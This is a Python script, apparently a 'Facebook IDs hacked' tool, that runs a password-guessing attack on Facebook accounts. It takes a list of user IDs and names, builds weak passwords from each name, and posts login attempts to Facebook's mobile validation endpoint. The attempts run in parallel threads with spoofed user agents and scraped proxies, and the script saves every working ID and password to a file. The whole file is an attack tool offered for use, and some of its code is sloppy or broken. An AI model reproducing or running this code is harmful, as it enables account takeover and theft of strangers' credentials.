#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \033[93;1m\x1b[1;96m\x1b[1;92m \x1b[1;96m[YOUSUF.M]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\033[93;1m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\033[93;1m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\033[93;1mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _YOUSUF_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
	
os.system("clear")
os.system('espeak -a 300 "Welcome to Sobuj Facebook Ids Hacked  tools "')

#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
\033[92;1m
  ███████  ██████  ██████  ██    ██      ██ 
  ██      ██    ██ ██   ██ ██    ██      ██ 
  ███████ ██    ██ ██████  ██    ██      ██ 
       ██ ██    ██ ██   ██ ██    ██ ██   ██ 
  ███████  ██████  ██████   ██████   █████     
  
  \x1b[1;92m\x1b[1;92m═━═━═━═━═━━═━═━══━━═━═━═━━━═━═━══━═━═━━━═━═\x1b[1;96m
  \033[1;92m[•] - DEVELOPER      \033[1;91m\033[1;32m: \033[1;92mSOBUJ  - AHMED
  \033[1;92m[•] - FACEBOOK       \033[1;91m\033[1;32m: \033[1;92mMD SOBUJ [ PAPI ]
  \033[1;92m[•] - WHATSAPP       \033[1;91m\033[1;32m: \033[1;92m+8801889794003
  \033[1;92m[•] - TOOL           \033[1;91m\033[1;32m: \033[1;92mRANDOM - FILE 
  \033[1;92m[•] - VERSION        \033[1;91m\033[1;32m:\033[1;92m 1.0.0
  \x1b[1;91m\x1b[1;92m═━═━═━═━═━━═━═━═━═━═━═━═━═━═━══━═━═━═━━━═━═\x1b[1;93m""")

os.system('clear')

#------------------[ BAGIAN-MENU ]----------------#

def menu():
	os.system('clear')
	banner()
	
	_YOUSUF_(f'\033[1;92m  [🚀] [A] FILE CRACK ')
	_YOUSUF_(f'\033[1;92m  [🚀] [B] RANDOM CRACK')
	_YOUSUF_(f'\033[1;92m  [🚀] [C] CONTACT ME ')
	_____YOUSUF_____ = input('  [🚀]\033[1;37m CHOICE \033[1;92m ⇉⇉ \x1b[1;92m ')
	if _____YOUSUF_____ in ['A']:
		F()
	
	if _____YOUSUF_____ in ['B']:
		F()
		
	if _____YOUSUF_____ in ['C']:
		os.system("xdg-open https://www.facebook.com/sobuj584")
		os.system('rm -rf .cookie.txt')
	 
	else:
		print(' 𝐖𝐫𝐨𝐧𝐠 𝐂𝐡𝐨𝐢𝐜𝐞 𝐁𝐚𝐫𝐚 😩 ')
		exit()
def error():
	print(f' 𝐒𝐨𝐫𝐫𝐲, 𝐏𝐥𝐳 𝐂𝐡𝐨𝐨𝐬𝐞 𝐭𝐡𝐞 𝐑𝐢𝐠𝐡𝐭 𝐌𝐞𝐧𝐮')
	time.sleep(2)
	back()
	
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')


#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' \033[92;1m [🚀] \033[1;37mExample: /sdcard/xxx.txt ')
			fileX = input (' \033[92;1m [🚀] \033[1;37mEnter Your File \033[92;1m➤  ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \033[92;1m [🚀] \033[1;37mTOTAL ID \033[92;1m➤ '+str(len(id)))
			Settings()
		except IOError:
			print(" \033[92;1m [🚀] \033[1;37mfile %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f' \033[92;1m [🚀] \033[1;37m[ A ] \033[38;5;46mOnly New Id  \033[1;30m[ BEST ]\n \033[92;1m [🚀] \033[1;37m[ B ] \033[38;5;46mNew Old Mix  ')
	hu = input(' \033[92;1m [🚀] \033[38;5;46mChoose \033[1;37m➤ ')
	if hu in ['1','A']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','B']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \033[92;1m \033[92;1m[🚀] \033[1;30mWrong Option Bara')
		exit()
	
	#print(f' \033[92;1m \033[92;1m[🚀] \033[1;37m[ 1 ] \033[92;1mMobile ')
	hc = input#(' \033[92;1m \033[92;1m[🚀] Choose \033[1;37m➤  ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input#('  \033[92;1m \033[92;1m[🚀] \033[1;37m[ d ] \033[1;34mAuto Password \033[1;30m[BEST]\n \033[1;34m [🚀] Choice \033[1;37m➤  ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		#print(f'Add Password Manual Minimam 6 Character')
		#pwku=input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
os.system("clear")
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'  ═━═━═━═━═━━═━═━═━═━═━═━═━━═━══━═━═━━═━═━═━═')
	print(f"\033[93;1m  [🚀] \x1b[1;92mTOTAL ID ─────────\033[38;5;46m➤ \x1b[1;92m"+str(len(id)))
	print(f"\033[93;1m  [🚀] \033[93;1mNOTE. \033[38;5;46m[ USE HELICOPTER MODE BEFORE USE ] ")
	print(f'\033[1;37m  ═━═━═━═━═━━═━═━═━═━═━━═━═━══━═━═━═━━═━═━═━═')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'2023')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(57273200)
					pwv.append('57273200')
					pwv.append(frs+'@')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'2023')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(57273200)
					pwv.append('57273200')
					pwv.append(frs+'@')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	os.system('espeak -a 300 "crack process has Been complete "')
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐑𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 ')
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ OK : {h}%s '%(ok))
	print(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤  Main Manu \x1b[1;92m[Y]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1mExit [T]')
	woi = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐡𝐨𝐢𝐜𝐞 : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ abar dekha hobe 🥹Allah Hafiz Bro 🥹 {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}  ALIVE{h} [{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.system('espeak -a 300 "bad luck but lock Ids Hacked Done  "')
				print(f'\r \033[38;5;46m [CP]  \033[93;1m{idf} | {pw}{N}')     
				
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#print(f'\r{H}\n YM-OK [💚] {idf} | {pw}\n [💉]COOKIES ➤ {kuki}\n [🚀] \033[1;30mUSER AGENT ➤ {ua}{N}')
				#print(f'\r{H}\n YM-OK    [💚] {idf} \033[97;1m pass ❥\033[1;92m  {pw}')
				os.system('espeak -a 300 "Congratulations Ids Hacked Done "')
				print(f'\r \033[93;1m [OK]  \033[1;92m{idf} | {pw}{N}')     
				#open('/sdcard/YOUSUF_COOKIE.txt','a').write(idf+'|'+pw+'|'+coki+'\n')
				open('/sdcard/Sobuj-OK.txt', 'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				print(uid,ps,)
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#

#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()